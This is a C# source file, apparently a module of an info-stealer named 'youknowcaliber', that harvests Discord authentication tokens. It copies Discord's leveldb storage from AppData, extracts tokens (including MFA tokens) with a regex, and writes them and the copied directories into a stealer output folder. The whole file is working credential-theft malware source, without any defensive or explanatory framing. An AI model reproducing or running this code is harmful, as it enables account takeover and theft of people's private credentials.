using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace youknowcaliber
{
    class Discord
    {
        private static Regex TokenRegex = new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}");
        private static string[] DiscordDirectories = new string[] {
            "Discord\\Local Storage\\leveldb",
            "Discord PTB\\Local Storage\\leveldb",
            "Discord Canary\\leveldb",
        };

        // Write tokens
        public static void WriteDiscord()
        {
            try
            {
                string Stealer_Dir = Help.ExploitDir + "\\Discord";
                string[] lcDicordTokens = GetTokens();
                if (lcDicordTokens.Length != 0)
                {
                    Directory.CreateDirectory(Stealer_Dir);

                    foreach (string token in lcDicordTokens)
                        File.AppendAllText(Stealer_Dir + "\\Tokens.txt", token + "\n");


                }
                CopyLevelDb();
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }

        // Copy Local State directory
        private static void CopyLevelDb()
        {
            string Stealer_Dir = Help.ExploitDir + "\\Discord";
            foreach (string dir in DiscordDirectories)
            {
                string directory = Path.GetDirectoryName(Path.Combine(Paths.appdata, dir));
                string cpdirectory = Path.Combine(Stealer_Dir,
                    new DirectoryInfo(directory).Name);

                if (!Directory.Exists(directory))
                    return;
                try
                {
                    Filemanager.CopyDirectory(directory, cpdirectory);
                    Counting.Discord++;
                }
                catch { }
            }
        }

      
        // Get discord tokens
        public static string[] GetTokens()
        {
            List<string> tokens = new List<string>();
            try
            {
                foreach (string dir in DiscordDirectories)
                {
                    string directory = Path.Combine(Paths.appdata, dir);
                    string cpdirectory = Path.Combine(Path.GetTempPath(), new DirectoryInfo(directory).Name);

                    if (!Directory.Exists(directory))
                        continue;

                    Filemanager.CopyDirectory(directory, cpdirectory);

                    foreach (string file in Directory.GetFiles(cpdirectory))
                    {
                        if (!file.EndsWith(".log") && !file.EndsWith(".ldb"))
                            continue;

                        string text = File.ReadAllText(file);
                        Match match = TokenRegex.Match(text);
                        if (match.Success)
                            tokens.Add($"{match.Value}");
                        Counting.Discord++;
                    }

                    Filemanager.RecursiveDelete(cpdirectory);

                }
            }
            catch (Exception ex) 
            { 
                Console.WriteLine(ex);
            }
            
            return tokens.ToArray();
        }
    }
}
